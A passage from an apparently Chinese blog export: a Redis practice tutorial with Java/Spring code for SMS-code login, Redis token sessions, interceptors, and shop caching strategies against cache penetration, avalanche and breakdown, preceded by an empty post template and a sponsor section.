题目\n\n>\n\n### 解答\n\n\n\n```java\n\n```\n\n### 复杂度\n\n\n\n# ❤️Sponsor\n\n您的支持是我不断前进的动力，如果你觉得本文对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["数据结构","算法"],"categories":["结构-算法"]},{"title":"Redis-实战篇","url":"/posts/32967.html","content":"\n# ⓪系统简介\n\n1. **短信登录**：使用Redis共享session来实现\n\n2. **商户查询缓存**：理解缓存击穿，缓存穿透，缓存雪崩等问题\n\n3. **优惠卷秒杀**\n   - 学会Redis的计数器功能， 结合Lua完成高性能的redis操作\n   \n   - 学会Redis分布式锁的原理，包括Redis的三种消息队列\n   \n4. **附近的商户**：利用Redis的GEOHash来完成对于地理坐标的操作\n\n5. **UV统计**：使用Redis来完成统计功能\n\n6. **用户签到**：使用Redis的BitMap数据统计功能\n\n7. **好友关注**：基于Set集合的关注、取消关注，共同关注等等功能\n\n8. **达人探店**：基于List完成点赞列表的操作，基于SortedSet来完成点赞的排行榜功能\n\n![](https://img.jwt1399.top/img/202210261714909.png)\n\n\n\n# ①短信登录\n\n## ❶基于session实现登录\n\n### 0.登录流程分析\n\n![基于Session实现登录流程](https://img.jwt1399.top/img/202210121713673.png)\n\n**1.发送短信验证码：**\n\n用户在提交手机号后，会校验手机号是否合法，\n\n- 如果不合法，则要求用户重新输入手机号\n\n- 如果合法，后台生成对应的验证码，同时将验证码进行保存，然后再通过短信将验证码发送给用户\n\n**2.验证码登录/注册：**\n\n用户将验证码和手机号进行输入，后台从`session`中拿到当前验证码，然后和用户输入的验证码进行校验，\n\n- 如果不一致，则无法通过校验；\n- 如果一致，则后台根据手机号查询用户；\n  - 如果用户不存在，则为用户创建账号信息，保存到数据库，并用户信息保存到`session`中，\n  - 如果用户存在，将用户信息保存到`session`中，\n  - 无论是否存在，都将用户信息保存到`session`中是为了方便后续获得当前登录信息\n\n**3.校验登录状态:**\n\n用户请求时，会从`cookie`中携带`JsessionId`到后台，后台通过`JsessionId`从`session`中拿到用户信息，\n\n- 如果没有`session`信息，则进行拦截，\n- 如果有`session`信息，则将用户信息保存到`threadLocal`中，并且放行\n\n### 1.发送验证码\n\n![页面流程](https://img.jwt1399.top/img/202210121713058.png)\n\n```java\npackage com.kbdp.service.impl;\n\n@Service\n@Slf4j\npublic class UserServiceImpl extends ServiceImpl<UserMapper, User> implements IUserService {\n\n    @Override\n    public Result sendCode(String phone, HttpSession session) {\n        // 1.校验手机号\n        if (RegexUtils.isPhoneInvalid(phone)) {\n            // 2.如果不符合，返回错误信息\n            return Result.fail(\"手机号格式错误！\");\n        }\n        // 3.符合，生成验证码\n        String code = RandomUtil.randomNumbers(6);\n        // 4.保存验证码到 session\n        session.setAttribute(\"code\",code);\n        // 5.发送验证码\n        log.debug(\"发送短信验证码成功，验证码：{}\", code);\n        // 返回ok\n        return Result.ok();\n    }\n}\n```\n\n### 2.登录/注册\n\n![页面流程](https://img.jwt1399.top/img/202210132211795.png)\n\n```java\npackage com.kbdp.service.impl;\n\n@Service\n@Slf4j\npublic class UserServiceImpl extends ServiceImpl<UserMapper, User> implements IUserService {\n\n  @Override\n  public Result login(LoginFormDTO loginForm, HttpSession session) {\n    // 1.校验手机号\n    String phone = loginForm.getPhone();\n    if (RegexUtils.isPhoneInvalid(phone)) {\n      // 2.如果不符合，返回错误信息\n      return Result.fail(\"手机号格式错误！\");\n    }\n    // 3.校验验证码\n    Object cacheCode = session.getAttribute(\"code\");\n    String code = loginForm.getCode();\n    if (cacheCode == null || !cacheCode.toString().equals(code)) {\n      //4.不一致，报错\n      return Result.fail(\"验证码错误\");\n    }\n    //5.一致，根据手机号查询用户\n    //User user = query().eq(\"phone\", phone).one();\n    LambdaQueryWrapper<User> lqw = new LambdaQueryWrapper<>();\n    User user = getOne(lqw.eq(User::getPhone, phone));\n    //6.判断用户是否存在\n    if(user == null){\n      //不存在，则创建\n      user =  createUserWithPhone(phone);\n    }\n    //7.保存用户信息到session中\n    session.setAttribute(\"user\",user);\n    return Result.ok();\n  }\n\n  private User createUserWithPhone(String phone) {\n    User user = new User();\n    user.setPhone(phone);\n    user.setNickName(USER_NICK_NAME_PREFIX + RandomUtil.randomNumbers(10));\n    save(user);\n    return user;\n  }\n  \n}\n```\n\n### 3.登录验证\n\n#### a.前置知识\n\n- Tomcat的运行原理\n\n![](../images/Redis-实战篇/1653068196656.png)\n\n当用户发起请求时，会访问我们tomcat注册的端口，任何程序想要运行，都需要有一个线程对当前端口号进行监听，tomcat也不例外，当监听线程知道用户想要和tomcat连接时，那会由监听线程创建socket连接，socket都是成对出现的，用户通过socket互相传递数据，当tomcat端的socket接受到数据后，此时监听线程会从tomcat的线程池中取出一个线程执行用户请求，在我们的服务部署到tomcat后，线程会找到用户想要访问的工程，然后用这个线程转发到工程中的controller，service，dao中，并且访问对应的DB，在用户执行完请求后，再统一返回，再找到tomcat端的socket，再将数据写回到用户端的socket，完成请求和响应\n\n通过以上讲解，我们可以得知每个用户其实对应都是去找tomcat线程池中的一个线程来完成工作的， 使用完成后再进行回收，既然每个请求都是独立的，所以在每个用户去访问我们的工程时，我们可以使用threadlocal来做到线程隔离，每个线程操作自己的一份数据\n\n- Threadlocal\n\n`ThreadLocal` 叫做本地线程变量，`ThreadLocal` 中填充的的是当前线程的变量，该变量对其他线程而言是封闭且隔离的\n\n#### b.具体实现\n\n\n\n![](https://img.jwt1399.top/img/202210261714702.png)\n\n- 拦截器代码\n\n```java\npublic class LoginInterceptor implements HandlerInterceptor {\n\n    @Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n       //1.获取session\n        HttpSession session = request.getSession();\n        //2.获取session中的用户\n        Object user = session.getAttribute(\"user\");\n        //3.判断用户是否存在\n        if(user == null){\n              //4.不存在，拦截，返回401状态码\n              response.setStatus(401);\n              return false;\n        }\n        //5.存在，保存用户信息到Threadlocal\n        UserHolder.saveUser((User)user);\n        //6.放行\n        return true;\n    }\n}\n```\n\n- 让拦截器生效\n\n```java\n@Configuration\npublic class MvcConfig implements WebMvcConfigurer {\n\n    @Override\n    public void addInterceptors(InterceptorRegistry registry) {\n        // 登录拦截器\n        registry.addInterceptor(new LoginInterceptor())\n                .excludePathPatterns(\n                        \"/shop/**\",\n                        \"/voucher/**\",\n                        \"/shop-type/**\",\n                        \"/upload/**\",\n                        \"/blog/hot\",\n                        \"/user/code\",\n                        \"/user/login\"\n                );\n    }\n}\n```\n\n### 4.隐藏用户敏感信息\n\n我们通过浏览器观察到此时用户的全部信息都在，这样极为不靠谱，所以我们应当在返回用户信息之前，将用户的敏感信息进行隐藏，采用的核心思路就是书写一个UserDTO对象，这个UserDTO对象就没有敏感信息了，我们在返回前，将有用户敏感信息的User对象转化成没有敏感信息的UserDTO对象，那么就能够避免这个尴尬的问题了\n\n```java\n@Data\npublic class UserDTO {\n    private Long id;\n    private String nickName;\n    private String icon;\n}\n```\n\n**在登录方法处修改**\n\n```java\n//7.保存用户信息到session中\nsession.setAttribute(\"user\", BeanUtils.copyProperties(user,UserDTO.class));\n```\n\n**在拦截器处：**\n\n```java\n//5.存在，保存用户信息到Threadlocal\nUserHolder.saveUser((UserDTO)user);\n```\n\n**在UserHolder处：将user对象换成UserDTO**\n\n```java\npublic class UserHolder {\n    private static final ThreadLocal<UserDTO> tl = new ThreadLocal<>();\n\n    public static void saveUser(UserDTO user){\n        tl.set(user);\n    }\n\n    public static UserDTO getUser(){\n        return tl.get();\n    }\n\n    public static void removeUser(){\n        tl.remove();\n    }\n}\n```\n\n## ❷集群的session共享问题\n\n> **集群的session 共享问题**：多台Tomcat并不共享session存储空间，当请求切换到不同tomcat服务时导致数据丢失的问题。\n\n![](https://img.jwt1399.top/img/202210261713817.png)\n\n每个 tomcat 中都有一份属于自己的session，假设用户第一次访问第一台tomcat，并且把自己的信息存放到第一台服务器的session中，但是第二次这个用户访问到了第二台tomcat，那么在第二台服务器上，肯定没有第一台服务器存放的session，所以此时整个登录拦截功能就会出现问题，我们能如何解决这个问题呢？\n\n早期的方案是session拷贝，就是说虽然每个tomcat上都有不同的session，但是每当任意一台服务器的session修改时，都会同步给其他的Tomcat服务器的session，这样的话，就可以实现session的共享了\n\n但是这种方案具有两个大问题\n\n- 1、每台服务器中都有完整的一份session数据，服务器压力过大。\n\n- 2、session拷贝数据时，可能会出现延迟\n\n所以后来采用的方案都是基于redis来完成，我们把session换成redis，redis数据本身就是共享的，就可以避免session共享的问题了\n\n## ❸Redis代替session实现登录\n\n### 1.key设计\n\n> 利用redis来存储数据，那么到底使用哪种结构呢？\n\n由于存入的数据比较简单，我们可以考虑使用String，或者是使用Hash\n\n- 使用String结构，以JSON字符串来保存，比较直观，多占用一点空间(还需存`{}、\"\"`等字符)\n\n- 使用Hash结构，可以将对象中的每个字段独立存储，可以针对单个字段做CRUD，并且内存占用更少\n\n|                        String                        |                         Hash                         |\n| :--------------------------------------------------: | :--------------------------------------------------: |\n| ![](https://img.jwt1399.top/img/202210261621745.png) | ![](https://img.jwt1399.top/img/202210261621354.png) |\n\n在设计这个key的时候，我们之前讲过需要满足两点\n\n1、key要具有唯一性\n\n2、key要方便携带\n\n如果我们采用phone：手机号这个的数据来存储当然是可以的，但是如果把这样的敏感数据存储到redis中并且从页面中带过来毕竟不太合适，所以我们在后台生成一个随机串token，然后让前端携带这个token就能完成我们的整体逻辑了\n\n### 2.新版登录流程\n\n![](https://img.jwt1399.top/img/202210261713092.png)\n\n当注册完成后，用户去登录会去校验用户提交的手机号和验证码，是否一致，如果一致，则根据手机号查询用户信息，不存在则新建，最后将用户数据保存到redis，并且生成token作为redis的key，当我们校验用户是否登录时，会去携带着token进行访问，从redis中取出token对应的value，判断是否存在这个数据，如果没有则拦截，如果存在则将其保存到threadLocal中，并且放行。\n\n### 3.具体实现\n\n**登录/注册业务代码**\n\n```java\n@Service\n@Slf4j\npublic class UserServiceImpl extends ServiceImpl<UserMapper, User> implements IUserService {\n\n    @Resource\n    private StringRedisTemplate stringRedisTemplate;\n\n    @Override\n    public Result sendCode(String phone, HttpSession session) {\n        // 1.校验手机号\n        if (RegexUtils.isPhoneInvalid(phone)) {\n            // 2.如果不符合，返回错误信息\n            return Result.fail(\"手机号格式错误！\");\n        }\n        // 3.符合，生成验证码\n        String code = RandomUtil.randomNumbers(6);\n        // 4.保存验证码到redis，并设置过期时间\n        stringRedisTemplate.opsForValue().set(LOGIN_CODE_KEY + phone, code, LOGIN_CODE_TTL, TimeUnit.MINUTES);\n        // 5.发送验证码\n        log.debug(\"发送短信验证码成功，验证码：{}\", code);\n        // 6.返回ok\n        return Result.ok();\n    }\n\n    @Override\n    public Result login(LoginFormDTO loginForm, HttpSession session) {\n        // 1.校验手机号\n        String phone = loginForm.getPhone();\n        if (RegexUtils.isPhoneInvalid(phone)) {\n            // 2.如果不符合，返回错误信息\n            return Result.fail(\"手机号格式错误！\");\n        }\n        // 3.从redis获取验证码并校验\n        String cacheCode = stringRedisTemplate.opsForValue().get(LOGIN_CODE_KEY + phone);\n        String code = loginForm.getCode();\n        if (cacheCode == null || !cacheCode.equals(code)) {\n            // 4.不一致，报错\n            return Result.fail(\"验证码错误\");\n        }\n        // 5.一致，根据手机号查询用户 select * from tb_user where phone = ?\n        //User user = query().eq(\"phone\", phone).one();\n        LambdaQueryWrapper<User> lqw = new LambdaQueryWrapper<>();\n        User user = getOne(lqw.eq(User::getPhone, phone));\n        // 6.判断用户是否存在\n        if (user == null) {\n            //不存在，则创建\n            user = createUserWithPhone(phone);\n        }\n        // 7.保存用户信息到redis中\n        // 7.1.随机生成token，作为登录令牌\n        String token = UUID.randomUUID().toString(true);\n        // 7.2.将User对象转为HashMap存储\n        UserDTO userDTO = BeanUtil.copyProperties(user, UserDTO.class);\n        Map<String, Object> userMap = BeanUtil.beanToMap(userDTO, new HashMap<>(),\n                CopyOptions.create()\n                        .setIgnoreNullValue(true)\n                        .setFieldValueEditor((fieldName, fieldValue) -> fieldValue.toString()));\n        // 7.3.存储用户信息\n        String tokenKey = LOGIN_USER_KEY + token;\n        stringRedisTemplate.opsForHash().putAll(tokenKey, userMap);\n        // 7.4.设置token有效期\n        stringRedisTemplate.expire(tokenKey, LOGIN_USER_TTL, TimeUnit.MINUTES);\n        // 8.返回token\n        return Result.ok(token);\n    }\n\n    private User createUserWithPhone(String phone) {\n        User user = new User();\n        user.setPhone(phone);\n        user.setNickName(USER_NICK_NAME_PREFIX + RandomUtil.randomNumbers(10));\n        save(user);\n        return user;\n    }\n}\n```\n\n**校验登录，监听器代码**\n\n```java\npackage com.kbdp.utils;\n\npublic class LoginInterceptor implements HandlerInterceptor {\n\n    //构造器注入（LoginInterceptor不是由Spring创建的）\n    private StringRedisTemplate stringRedisTemplate;\n    public LoginInterceptor(StringRedisTemplate stringRedisTemplate) {\n        this.stringRedisTemplate = stringRedisTemplate;\n    }\n\n    @Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n        // 1.获取请求头中的token\n        String token = request.getHeader(\"authorization\");\n        if (StrUtil.isBlank(token)){\n            //不存在，拦截，返回401状态码\n            response.setStatus(401);\n            return false;\n        }\n        // 2.基于TOKEN获取redis中的用户\n        String key  = LOGIN_USER_KEY + token;\n        Map<Object, Object> userMap = stringRedisTemplate.opsForHash().entries(key);\n        // 3.判断用户是否存在\n        if(userMap.isEmpty()){\n            // 4.不存在，拦截，返回401状态码\n            response.setStatus(401);\n            return false;\n        }\n        // 5.将查询到的hash数据转为UserDTO\n        UserDTO userDTO = BeanUtil.fillBeanWithMap(userMap, new UserDTO(), false);\n        //6.存在，保存用户信息到Threadlocal\n        UserHolder.saveUser(userDTO);\n        // 7.刷新token有效期\n        stringRedisTemplate.expire(key, LOGIN_USER_TTL, TimeUnit.MINUTES);\n        // 8.放行\n        return true;\n    }\n}\n```\n\n```java\npackage com.kbdp.config;\n\n@Configuration\npublic class MvcConfig implements WebMvcConfigurer {\n\n    //注入StringRedisTemplate\n    @Resource\n    private StringRedisTemplate stringRedisTemplate;\n\n    @Override\n    public void addInterceptors(InterceptorRegistry registry) {\n        // 登录拦截器\n        registry.addInterceptor(new LoginInterceptor(stringRedisTemplate))\n                .excludePathPatterns(\n                        \"/shop/**\",\n                        \"/voucher/**\",\n                        \"/shop-type/**\",\n                        \"/upload/**\",\n                        \"/blog/hot\",\n                        \"/user/code\",\n                        \"/user/login\"\n                );\n    }\n}\n```\n\n### 4.解决token刷新问题\n\n> 即用户只要一直访问页面，那么就刷新token，既可以一直保持登录状态\n\n**初始方案：**\n\n初始方案中，确实可以使用对应路径的拦截，同时刷新登录token令牌的存活时间，但是现在这个拦截器只是拦截需要被拦截的路径（登录才能访问的页面），假设当前用户访问了一些不需要拦截的路径，那么这个拦截器就不会生效，所以此时token令牌刷新的动作就不会执行，所以这个方案是存在问题的\n\n![](https://img.jwt1399.top/img/202210271640418.png)\n\n**优化方案**\n\n之前的拦截器无法对不需要拦截的路径生效，那么我们可以添加一个拦截器，在第一个拦截器中拦截所有的路径，把第二个拦截器做的事情放入到第一个拦截器中，同时刷新token令牌，因为第一个拦截器有了threadLocal的数据，所以此时第二个拦截器只需要判断拦截器中的user对象是否存在即可，完成整体刷新功能。\n\n![](https://img.jwt1399.top/img/202210271640150.png)\n\n\n\n**RefreshTokenInterceptor**\n\n```java\npublic class RefreshTokenInterceptor implements HandlerInterceptor {\n\n    private StringRedisTemplate stringRedisTemplate;\n\n    public RefreshTokenInterceptor(StringRedisTemplate stringRedisTemplate) {\n        this.stringRedisTemplate = stringRedisTemplate;\n    }\n\n\t\t@Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n        // 1.获取请求头中的token\n        String token = request.getHeader(\"authorization\");\n        if (StrUtil.isBlank(token)){\n            return true;\n        }\n\n        // 2.基于TOKEN获取redis中的用户\n        String key  = LOGIN_USER_KEY + token;\n        Map<Object, Object> userMap = stringRedisTemplate.opsForHash().entries(key);\n        // 3.判断用户是否存在\n        if(userMap.isEmpty()){\n            return true;\n        }\n        // 4.将查询到的hash数据转为UserDTO\n        UserDTO userDTO = BeanUtil.fillBeanWithMap(userMap, new UserDTO(), false);\n        // 5.存在，保存用户信息到Threadlocal\n        UserHolder.saveUser(userDTO);\n        // 6.刷新token有效期\n        stringRedisTemplate.expire(key, LOGIN_USER_TTL, TimeUnit.MINUTES);\n        // 7.放行\n        return true;\n    }\n\n    @Override\n    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {\n        // 移除用户\n        UserHolder.removeUser();\n    }\n}\n\t\n```\n\n**LoginInterceptor**\n\n```java\npublic class LoginInterceptor implements HandlerInterceptor {\n\n    @Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n        // 1.判断是否需要拦截（ThreadLocal中是否有用户）\n        if (UserHolder.getUser() == null) {\n            // 没有用户，需要拦截，设置状态码\n            response.setStatus(401);\n            // 拦截\n            return false;\n        }\n        // 有用户，则放行\n        return true;\n    }\n}\n```\n\n**让拦截器生效**\n\n```java\npackage com.kbdp.config;\n\n@Configuration\npublic class MvcConfig implements WebMvcConfigurer {\n\n    @Resource\n    private StringRedisTemplate stringRedisTemplate;\n\n    @Override\n    public void addInterceptors(InterceptorRegistry registry) {\n        // 登录拦截器\n        registry.addInterceptor(new LoginInterceptor())\n                .excludePathPatterns(\n                        \"/shop/**\",\n                        \"/voucher/**\",\n                        \"/shop-type/**\",\n                        \"/upload/**\",\n                        \"/blog/hot\",\n                        \"/user/code\",\n                        \"/user/login\"\n                ).order(1);\n        // token刷新的拦截器\n        registry.addInterceptor(new RefreshTokenInterceptor(stringRedisTemplate)).addPathPatterns(\"/**\").order(0);\n    }\n}\n//order()的作用是设置优先级，越小越先执行\n```\n\n# ②商户查询缓存\n\n## ❶缓存简介\n\n**缓存(**Cache)，就是数据交换的**缓冲区**,俗称的缓存就是**缓冲区内的数据**,一般从数据库中获取,存储于本地代码(例如:\n\n```java\n例1:Static final ConcurrentHashMap<K,V> map = new ConcurrentHashMap<>(); 本地用于高并发\n\n例2:static final Cache<K,V> USER_CACHE = CacheBuilder.newBuilder().build(); 用于redis等缓存\n\n例3:Static final Map<K,V> map =  new HashMap(); 本地缓存\n```\n\n由于其被**Static**修饰，所以随着类的加载而被加载到**内存之中**，作为本地缓存，由于其又被**final**修饰，所以其引用(例3:map)和对象(例3:new HashMap())之间的关系是固定的，不能改变，因此不用担心赋值(=)导致缓存失效;\n\n**为什么要使用缓存**\n\n缓存数据存储于代码中，而代码运行在内存中，内存的读写性能远高于磁盘，缓存可以大大降低**用户访问并发量带来的**服务器读写压力\n\n| 缓存优点                                    | 缓存缺点                                   |\n| :------------------------------------------ | ------------------------------------------ |\n| 降低后端负载 <br>提高读写效率，降低响应时间 | 数据一致性成本<br>代码维护成本<br>运维成本 |\n\n**如何使用缓存**\n\n实际开发中，会构筑多级缓存来使系统运行速度进一步提升，例如：本地缓存与redis中的缓存并发使用\n\n- **浏览器缓存**：主要是存在于浏览器端的缓存\n\n- **应用层缓存：**可以分为tomcat本地缓存，比如之前提到的map，或者是使用redis作为缓存\n\n- **数据库缓存：**在数据库中有一片空间是 buffer pool，增改查数据都会先加载到mysql的缓存中\n\n- **CPU缓存：**当代计算机最大的问题是 cpu性能提升了，但内存读写速度没有跟上，所以为了适应当下的情况，增加了cpu的L1，L2，L3级的缓存\n\n![](../images/Redis-实战篇/image-20220523212915666.png)\n\n## ❷添加商户缓存\n\n在我们查询商户信息时，是直接从数据库中去进行查询的，直接查询数据库那肯定慢咯，所以我们需要增加缓存\n\n```java\n@GetMapping(\"/{id}\")\npublic Result queryShopById(@PathVariable(\"id\") Long id) {\n    //这里是直接查询数据库\n    return Result.ok(shopService.getById(id));\n}\n```\n\n### 1.缓存思路\n\n标准的操作方式就是查询数据库之前先查询缓存，如果缓存数据存在，则直接从缓存中返回，如果缓存数据不存在，再查询数据库，然后将数据存入redis。\n\n![](https://img.jwt1399.top/img/202210311652776.png)\n\n### 2.代码实现\n\n```java\n@GetMapping(\"/{id}\")\npublic Result queryShopById(@PathVariable(\"id\") Long id) {\n    //return Result.ok(shopService.getById(id)); //这里是直接查询数据库\n    return shopService.queryById(id); //缓存实现\n}\n```\n\n```java\n@Service\npublic class ShopServiceImpl extends ServiceImpl<ShopMapper, Shop> implements IShopService {\n\n    @Resource\n    private StringRedisTemplate stringRedisTemplate;\n\n    @Override\n    public Result queryById(Long id) {\n        String key = CACHE_SHOP_KEY + id;\n        // 1.从redis 查询商铺缓存\n        String shopJson = stringRedisTemplate.opsForValue().get(key);\n        // 2.判断是否存在\n        if (StrUtil.isNotBlank(shopJson)) {\n            // 3.存在，直接返回\n            Shop shop = JSONUtil.toBean(shopJson, Shop.class);\n            return Result.ok(shop);\n        }\n        // 4.不存在，根据id查询数据库\n        Shop shop = getById(id);\n        // 5.数据库也不存在，返回错误\n        if (shop == null) {\n            return Result.fail(\"店铺不存在！\");\n        }\n        // 6.数据库存在，写入redis\n        stringRedisTemplate.opsForValue().set(key, JSONUtil.toJsonStr(shop));\n        // 7.返回\n        return Result.ok(shop);\n    }\n}\n```\n\n## ❸缓存更新策略\n\n### 1.更新策略\n\n**缓存更新**是Redis为了节约内存而设计出来的一个东西，主要是因为内存数据宝贵，当我们向redis插入太多数据，此时就可能会导致缓存中的数据过多，所以redis会对部分数据进行更新。有三种更新方法：\n\n- **内存淘汰：**redis自动进行，当redis内存达到咱们设定的max-memery的时候，会自动触发淘汰机制，淘汰掉一些不重要的数据(可以自己设置策略方式)\n\n- **超时剔除：**当我们给redis设置了过期时间ttl之后，redis会将超时的数据进行删除，方便继续使用缓存\n\n- **主动更新：**我们可以手动调用方法把缓存删掉，通常用于解决缓存和数据库不一致问题\n\n![](../images/Redis-实战篇/1653322506393.png)\n\n**数据不一致解决方案**\n\n> 由于我们的**缓存的数据源来自于数据库**，而数据库的**数据是会发生变化的**，因此，如果当数据库中**数据发生变化，而缓存却没有同步**，此时就会有**一致性问题存在**，其后果是：用户使用缓存中的过时数据，就会产生类似多线程数据安全问题，从而影响业务，产品口碑等；怎么解决呢？有如下几种方案\n\n- Cache Aside Pattern ：缓存调用者在更新完数据库后再去更新缓存，也称之为双写方案\n\n- Read/Write Through Pattern : 由系统本身完成，数据库与缓存的问题交由系统本身去处理\n\n- Write Behind Caching Pattern ：调用者只操作缓存，其他线程去异步处理数据库，实现最终一致\n\n综合考虑使用方案一，但是操作缓存和数据库时有三个问题需要考虑：\n\n如果采用第一个方案，那么假设我们每次操作数据库后，都操作缓存，但是中间如果没有人查询，那么这个更新动作实际上只有最后一次生效，中间的更新动作意义并不大，我们可以把缓存删除，等待再次查询时，将缓存中的数据加载出来\n\n* 1.删除缓存还是更新缓存？\n  * 更新缓存：每次更新数据库都更新缓存，无效写操作较多\n  * 删除缓存：更新数据库时让缓存失效，查询时再更新缓存\n\n* 2.如何保证缓存与数据库的操作的同时成功或失败？\n  * 单体系统，将缓存与数据库操作放在一个事务\n  * 分布式系统，利用TCC等分布式事务方案\n\n* 3.先操作缓存还是先操作数据库？\n  * 先删除缓存，再操作数据库\n  * 先操作数据库，再删除缓存\n\n我们应当是先操作数据库，再删除缓存，原因在于，如果你选择第一种方案，在两个线程并发来访问时，假设线程1先来，他先把缓存删了，此时线程2过来，他查询缓存数据并不存在，此时他写入缓存，当他写入缓存后，线程1再执行更新动作时，实际上写入的就是旧的数据，新的数据被旧数据覆盖了。\n\n![](../images/Redis-实战篇/1653323595206.png)\n\n### 2.代码实现\n\n核心思路如下：\n\n- 1.根据id查询店铺时，如果缓存未命中，则查询数据库，将数据库结果写入缓存，并**设置超时时间**\n\n- 2.根据id修改店铺时，**先修改数据库，再删除缓存**\n\n**1.设置redis缓存时添加过期时间**\n\n```java\n@Service\npublic class ShopServiceImpl extends ServiceImpl<ShopMapper, Shop> implements IShopService {\n\n    @Resource\n    private StringRedisTemplate stringRedisTemplate;\n\n    @Override\n    public Result queryById(Long id) {\n         ......\n         // 6.数据库存在，写入redis，并添加过期时间\n        stringRedisTemplate.opsForValue().set(key, JSONUtil.toJsonStr(shop), CACHE_SHOP_TTL, TimeUnit.MINUTES);\n        ......\n    }\n}\n```\n\n**2.根据id修改店铺时，先修改数据库，再删除缓存**\n\n```java\n@Override\n@Transactional\npublic Result update(Shop shop) {\n    Long id = shop.getId();\n    if(id == null){\n      return Result.fail(\"店铺id不能为空！\");\n    }\n    // 1.更新数据库\n    updateById(shop);\n    // 2.删除缓存\n    stringRedisTemplate.delete(CACHE_SHOP_KEY + id);\n    return Result.ok();\n}\n```\n\n代码分析：当我们修改了数据之后，然后把缓存中的数据进行删除，查询时发现缓存中没有数据，则会从mysql中加载最新的数据，从而避免数据库和缓存不一致的问题。\n\n## ❹缓存穿透\n\n> 缓存穿透是指客户端请求的**数据在缓存中和数据库中都不存在**，这样缓存永远不会生效，这些请求都会打到数据库。\n\n### 1.解决思路\n\n缓存穿透的解决方案有哪些？\n\n- 缓存null值\n- 布隆过滤\n- 增强id的复杂度，避免被猜测id规律\n- 做好数据的基础格式校验\n- 加强用户权限校验\n- 做好热点参数的限流\n\n常见的解决方案有两种：\n\n|      | 缓存空对象                             | 布隆过滤器                |\n| :--: | -------------------------------------- | ------------------------- |\n| 优点 | 实现简单，维护方便                     | 内存占用较少，没有多余key |\n| 缺点 | 额外的内存消耗<br>可能造成短期的不一致 | 实现复杂<br/>存在误判可能 |\n\n**缓存空对象：**哪怕这个数据在数据库中不存在，我们也把这个数据存入到redis中去，这样，下次用户过来访问这个不存在的数据，那么在redis中也能找到这个数据\n\n**布隆过滤器：**通过一个庞大的二进制数组，走哈希思想去判断当前这个要查询的这个数据是否存在，如果布隆过滤器判断存在，则放行；不存在，则直接返回\n\n这种方式优点在于节约内存空间，但存在误判，误判原因在于：布隆过滤器走的是哈希思想，可能存在哈希冲突\n\n![](https://img.jwt1399.top/img/202211021526445.png)\n\n### 2.具体实现\n\n原来的逻辑中，如果发现这个数据在mysql中不存在，直接就返回404了，这样是会存在缓存穿透问题的\n\n现在的逻辑中：如果这个数据不存在，我们不会返回404 ，还是会把这个数据写入到Redis中，并且将value设置为空，欧当再次发起查询时，我们如果发现命中之后，判断这个value是否是null，如果是null，则是之前写入的数据，证明是缓存穿透数据，如果不是，则直接返回数据。\n\n![](https://img.jwt1399.top/img/202211021536810.png)\n\n```java\n\t\t@Override\n    public Result queryById(Long id) {\n        String key = CACHE_SHOP_KEY + id;\n        // 1.从redis 查询商铺缓存\n        String shopJson = stringRedisTemplate.opsForValue().get(key);\n        // 2.判断是否存在（3种情况，存在不为空，存在但为\"\"，不存在为null）\n        if (StrUtil.isNotBlank(shopJson)) {\n            // 3.存在，直接返回\n            Shop shop = JSONUtil.toBean(shopJson, Shop.class);\n            return Result.ok(shop);\n        }\n        //判断命中的是否是空值(区别null和\"\")\n        /*新增语句*/\n        if (\"\".equals(shopJson){\n          return Result.fail(\"店铺信息不存在！\");\n        }\n      \n        // 4.不存在，根据id查询数据库\n        Shop shop = getById(id);\n        // 5.数据库也不存在，返回错误\n        if (shop == null) {\n            /*新增语句*/\n            //不存在时存入空值\n            stringRedisTemplate.opsForValue().set(key,\"\",CACHE_NULL_TTL,TimeUnit.MINUTES);\n            return Result.fail(\"店铺不存在！\");\n        }\n        // 6.数据库存在，写入redis\n        stringRedisTemplate.opsForValue().set(key, JSONUtil.toJsonStr(shop), CACHE_SHOP_TTL, TimeUnit.MINUTES);\n        // 7.返回\n        return Result.ok(shop);\n    }\n```\n\n分析：当查询的数据在数据库和Redis中都不存在时，会在Redis中存入空值，并返回“店铺不存在！”，当再次查询该数据就不再经过数据库，而是去Redis中取，并返回“店铺信息不存在！”\n\n## ❺缓存雪崩\n\n> 缓存雪崩是指在**同一时段大量的缓存key同时失效或者Redis服务宕机**，导致大量请求到达数据库，带来巨大压力。\n\n### 解决思路\n\n* 给不同的Key的TTL添加随机值\n* 利用Redis集群提高服务的可用性\n* 给缓存业务添加降级限流策略\n* 给业务添加多级缓存\n\n## ❻缓存击穿\n\n> 缓存击穿问题也叫热点Key问题，指**一个被高并发访问并且缓存重建业务较复杂的key突然失效了**，无数的请求访问会在瞬间给数据库带来巨大的冲击。\n\n### 1.解决思路\n\n常见的解决方案有两种：\n\n* **互斥锁**\n\n因为锁能实现互斥性。假设线程过来，只能逐一的访问数据库，从而避免数据库访问压力过大，但这也会影响查询性能，因为此时会让查询的性能从并行变成了串行，我们可以采用tryLock方法 + double check来解决这样的问题。\n\n* **逻辑过期**\n\n之所以会出现这个缓存击穿问题，主要原因是在于我们对key设置了过期时间，假设我们不设置过期时间，其实就不会有缓存击穿的问题，但是不设置过期时间，这样数据不就一直占用我们内存了吗，可以采用逻辑过期方案。\n\n这种方案巧妙在于，异步的构建缓存，缺点在于在构建完缓存之前，返回的都是脏数据。\n\n|                            互斥锁                            |                           逻辑过期                           |\n| :----------------------------------------------------------: | :----------------------------------------------------------: |\n|     ![](https://img.jwt1399.top/img/202211021615160.png)     |     ![](https://img.jwt1399.top/img/202211021616600.png)     |\n| 